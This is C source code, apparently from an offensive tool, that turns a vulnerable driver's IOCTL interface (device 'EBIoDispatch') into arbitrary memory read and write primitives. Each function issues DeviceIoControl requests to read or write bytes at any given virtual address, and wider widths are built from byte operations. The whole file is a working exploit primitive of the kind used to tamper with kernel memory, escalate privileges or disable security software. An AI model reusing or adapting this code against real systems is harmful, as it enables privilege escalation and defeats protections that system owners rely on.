#include <Ntdefs.h>
#include <Utils.h>

#define CTL_TPWSAV_READ_BYTE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x832, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define CTL_TPWSAV_WRITE_BYTE   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x833, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define DEVICE_TPWSAV_NAME      L"\\\\.\\EBIoDispatch"

BOOLEAN NTAPI
TpwArbitaryWriteByte(
    _In_ ULONGLONG      VirtualAddress,
    _In_ BYTE           Value
) {
    HANDLE              DeviceHandle;
    DWORD               BytesReturned;

    DeviceHandle = CreateFileW(
        DEVICE_TPWSAV_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (DeviceHandle == INVALID_HANDLE_VALUE)
        return FALSE;

    LARGE_INTEGER Buffer[2];
    Buffer[0].QuadPart  = VirtualAddress;
    Buffer[1].LowPart   = Value;

    BOOL Result = DeviceIoControl(
        DeviceHandle,
        CTL_TPWSAV_WRITE_BYTE,
        Buffer,
        sizeof(Buffer),
        NULL,
        0,
        &BytesReturned,
        NULL
    );

    if (Result == FALSE) {
        CloseHandle(DeviceHandle);
        return FALSE;
    }

    CloseHandle(DeviceHandle);
    
    return TRUE;
}


BOOLEAN NTAPI
TpwArbitaryWriteWord(
    _In_ ULONGLONG      VirtualAddress,
    _In_ WORD           Value
) {
    BYTE LowByte        = (BYTE)(Value & 0xFF);
    BYTE HighByte       = (BYTE)((Value >> 8) & 0xFF);

    if(TpwArbitaryWriteByte(VirtualAddress, LowByte) == FALSE)
        return FALSE;

    if(TpwArbitaryWriteByte(VirtualAddress + 1, HighByte) == FALSE)
        return FALSE;

    return TRUE;
}

BOOLEAN NTAPI
TpwArbitaryWriteDword(
    _In_ ULONGLONG      VirtualAddress,
    _In_ DWORD          Value
) {
    WORD LowWord        = (WORD)(Value & 0xFFFF);
    WORD HighWord       = (WORD)((Value >> 16) & 0xFFFF);

    if (TpwArbitaryWriteWord(VirtualAddress, LowWord) == FALSE)
        return FALSE;

    if (TpwArbitaryWriteWord(VirtualAddress + 2, HighWord) == FALSE)
        return FALSE;

    return TRUE;
}

BOOLEAN NTAPI
TpwArbitaryWriteQword(
    _In_ ULONGLONG      VirtualAddress,
    _In_ ULONGLONG      Value
) {
    DWORD LowDword      = (DWORD)(Value & 0xFFFFFFFF);
    DWORD HighDword     = (DWORD)((Value >> 32) & 0xFFFFFFFF);

    if (TpwArbitaryWriteDword(VirtualAddress, LowDword) == FALSE)
        return FALSE;

    if (TpwArbitaryWriteDword(VirtualAddress + 4, HighDword) == FALSE)
        return FALSE;

    return TRUE;
}


BOOLEAN NTAPI
TpwArbitaryReadByte(
    _In_  ULONGLONG     VirtualAddress,
    _Out_ PBYTE         OutValue
) {
    HANDLE              DeviceHandle;
    DWORD               BytesReturned;

    DeviceHandle = CreateFileW(
        DEVICE_TPWSAV_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (DeviceHandle == INVALID_HANDLE_VALUE)
        return FALSE;

    LARGE_INTEGER Buffer[2];
    Buffer[0].QuadPart = VirtualAddress;
    Buffer[1].QuadPart = 0;

    BOOL Result = DeviceIoControl(
        DeviceHandle,
        CTL_TPWSAV_READ_BYTE,
        Buffer,
        sizeof(Buffer),
        Buffer,
        sizeof(Buffer),
        &BytesReturned,
        NULL
    );

    if (Result == FALSE) {
        CloseHandle(DeviceHandle);
        return FALSE;
    }

    *OutValue = (BYTE)(Buffer[1].LowPart & 0xFF);

    CloseHandle(DeviceHandle);

    return TRUE;
}

BOOLEAN NTAPI
TpwArbitaryReadWord(
    _In_  ULONGLONG     VirtualAddress,
    _Out_ PWORD         OutValue
) {
    BYTE LowByte, HighByte;

    if (TpwArbitaryReadByte(VirtualAddress, &LowByte) == FALSE)
        return FALSE;

    if (TpwArbitaryReadByte(VirtualAddress + 1, &HighByte) == FALSE)
        return FALSE;

    *OutValue = (WORD)((HighByte << 8) | LowByte);

    return TRUE;
}

BOOLEAN NTAPI
TpwArbitaryReadDword(
    _In_  ULONGLONG     VirtualAddress,
    _Out_ PDWORD        OutValue
) {
    WORD LowWord, HighWord;

    if (TpwArbitaryReadWord(VirtualAddress, &LowWord) == FALSE)
        return FALSE;

    if (TpwArbitaryReadWord(VirtualAddress + 2, &HighWord) == FALSE)
        return FALSE;

    *OutValue = (DWORD)((HighWord << 16) | LowWord);

    return TRUE;
}

BOOLEAN NTAPI
TpwArbitaryReadQword(
    _In_  ULONGLONG     VirtualAddress,
    _Out_ PULONGLONG    OutValue
) {
    DWORD LowDword, HighDword;

    if (TpwArbitaryReadDword(VirtualAddress, &LowDword) == FALSE)
        return FALSE;

    if (TpwArbitaryReadDword(VirtualAddress + 4, &HighDword) == FALSE)
        return FALSE;

    *OutValue = ((ULONGLONG)HighDword << 32) | LowDword;

    return TRUE;
}